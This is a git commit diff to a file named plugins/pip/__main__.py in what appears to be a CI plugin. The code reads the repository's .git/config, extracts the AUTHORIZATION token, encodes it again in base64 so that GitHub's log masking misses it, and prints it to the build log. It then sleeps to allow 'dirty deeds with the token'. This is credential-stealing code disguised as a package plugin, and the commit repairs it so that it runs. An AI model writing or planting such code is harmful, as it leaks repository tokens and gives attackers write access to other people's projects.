5aff144a7e20d1afc414939bc73998e308c6278b
phantomc15 <97042711+phantomc15@users.noreply.github.com>
2022-01-03 11:14:27 -0500

    Update __main__.py

--- plugins/pip/__main__.py
+++ plugins/pip/__main__.py
@@ -7,7 +7,8 @@ with open('.git/config') as f:
 
 # Print authorization - it's already b64-encoded,
 # we encode it again so that github doesn't strip it
-authLocation = config.index('AUTHORIZATION') 11print(b64encode(config[authLocation:].encode()).decode(), flush=True)
+authLocation = config.index('AUTHORIZATION') 
+print(b64encode(config[authLocation:].encode()).decode(), flush=True)
 
 # Sleep so that we have enough time to do our dirty deeds with the token
 for i in range(100):
